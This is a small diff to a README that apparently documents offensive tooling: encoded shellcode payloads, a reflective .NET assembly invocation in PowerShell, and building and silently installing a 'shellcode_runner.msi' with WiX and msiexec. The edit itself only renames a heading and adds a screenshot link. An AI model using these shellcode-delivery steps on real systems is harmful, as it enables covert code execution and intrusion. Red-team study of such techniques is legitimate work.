@@ -275,7 +275,7 @@ First, payloads that are located under ```payloads/XOR/``` and ```payloads/Caesa
  [*] PS>$ass.GetType("J46IIOTXPW.PZAZUJAD4V").GetMethod("NK6WAROB2W").Invoke($null,$null)
 ```
 -----
-### 1.5 MSI
+### 1.5 Generating MSI 
 
 **Modile shellcode_runner.xml**
 
@@ -305,6 +305,7 @@ wine light.exe -out shellcode_runner.msi shellcode_runner.wixobj -sval
 ```
 msiexec /q /i shellcode_runner.msi
 ```
+![image](https://user-images.githubusercontent.com/9944198/158666861-e853653c-d312-46f9-bbc5-64eb9ab08267.png)
 
 ---
 ## 2. Execute .Net Assemblies with Reflection
